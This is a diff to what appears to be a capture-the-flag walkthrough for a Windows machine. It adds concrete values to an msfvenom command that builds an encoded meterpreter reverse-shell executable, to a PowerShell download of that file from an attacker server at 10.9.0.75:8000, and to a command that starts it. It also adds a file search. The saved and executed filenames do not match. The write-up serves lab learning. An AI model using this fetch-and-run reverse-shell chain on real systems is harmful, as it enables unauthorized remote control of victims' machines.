@@ -101,7 +101,7 @@ Copy the above command to the configure section as discussed above and when done
 
 lets find the user.txt file now
 
-use the following to quickly find a text file using powershell query
+Use the following to quickly find a text file using powershell query
 ```shell
 Get-ChildItem -Path C:\ -Filter "user.txt" -Recurse -ErrorAction SilentlyContinue
 ```
@@ -121,14 +121,14 @@ Time to upgrade our shells from a simple netcat shell to a meterpreter shell
 ## Generate the MSFVenom Payload
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.78 LPORT=9090 -f exe -o shell_main.exe
 ```
 ## Download the payload on the webserver 
 1. We already have our python server running
 2. Lets download it from our attacker machine onto the webserver using the below command
 
 ```shell
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:8000/shell-name1.exe','shell-name1.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:8000/shell_main.exe','shell_main_.exe')"
 ```
 
 ![[Pasted image 20251013221421.png]]
@@ -142,7 +142,10 @@ msfconsole -q -x "use exploit/multi/handler set PAYLOAD windows/meterpreter/reve
 ## Execute the payload on the webserver
 use the following command in the shell code on the webserver
 ```
-Start-Process "shell-name1.exe"
+Start-Process "shell_main.exe"
 ```
 
+```
+Get-ChildItem -Path C:\ -Filter "shell_main.exe" -Recurse -ErrorAction SilentlyContinue
+```
 
